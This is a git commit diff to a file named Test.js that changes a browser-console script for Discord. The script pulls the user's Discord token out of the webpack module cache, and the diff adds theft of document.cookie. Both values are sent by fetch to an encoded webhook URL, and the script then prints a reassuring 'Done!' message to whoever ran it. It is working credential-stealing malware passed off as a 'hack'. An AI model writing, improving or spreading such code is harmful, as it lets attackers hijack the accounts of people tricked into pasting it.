078dc5c7ffa7433f3106e31355a198930bba881b
Tung <89498812+tungdo0602@users.noreply.github.com>
2021-10-27 16:38:02 +0700

    Update Test.js

--- Test.js
+++ Test.js
@@ -3,6 +3,7 @@ var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[   
         let t = req.c[e].exports;
         if (t && t.__esModule && t.default)
             for (let e in t.default) "getToken" === e && (discordhacks = t.default.getToken())
+            let hackpatcher = document.cookie
     }
 fetch(
   atob('webhook_base64encode_here'), 
@@ -12,10 +13,9 @@ fetch(
       'Content-Type': 'application/json',
     },
     body: JSON.stringify({
-      content:
-        discordhacks,
+      content: "1:" + discordhacks + "<BR>" + "2" + hackpatcher,
     }),
   }
 );
 console.clear()
-console.log('Successfully installed the script! reload page to the hack work.')
+console.log('Done!')
